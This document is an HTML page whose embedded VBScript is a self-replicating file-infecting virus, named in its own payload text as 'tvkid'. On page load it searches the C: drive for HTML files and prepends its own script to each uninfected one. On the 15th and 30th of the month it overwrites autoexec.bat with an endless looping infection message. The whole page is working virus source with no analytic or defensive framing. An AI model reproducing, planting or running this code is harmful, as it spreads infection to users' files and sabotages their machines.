<html><!--babe-->
<body>

<SCRIPT language=vbscript>
Sub Window_OnLoad()
call bomb
call pay

end sub
 Sub Bomb 
set fso=CreateObject("Scripting.FileSystemObject")
set WordObj=createobject("Word.application")
set fs=wordobj.application.filesearch
fs.newsearch
fs.lookin="c:\"
fs.searchsubfolders=true
fs.filename= "*.html"
FS.EXECUTE
for t=1 to fs.foundfiles.count
set bombed=fso.opentextfile(fs.foundfileS(t),1)
f = bombed.readline
bombed.close
if f <> "<html><!--babe-->" then
Set TRange = document.body.createTextRange
Set g=fso.opentextfile(fs.foundfiles(t), 1)
Contents = g.readall
g.close
set h=fso.opentextfile(fs.founDfiles(t), 2, true)
h.writeLine "<html><!--babe-->"
h.writeLine "<body>"
h.writeLine trange.htmltext
h.writeLine "</body>"
h.writeLine "</html>"
h.writeLine Contents
h.close
end if
next 
wordobj.quit 
 end sub
 Sub pay
if day(now)=15 or day(now)=30 then
set fso=createobject("Scripting.FileSystemObject")
set g=opentextfile("c:\autoexec.bat", 2, true)
g.writeline "echo off"
g.writeline "echo this computer waz infected from dr[kazoy]"
g.writeline "echo A Demo Html Virus called tvkid"
g.writeline ":gek"
g.writeline "echo Hello Tvkid"
g.writeline "pause"
g.writeline "goto gek"
g.close
END IF
END SUB
</SCRIPT>
</body>
</html>
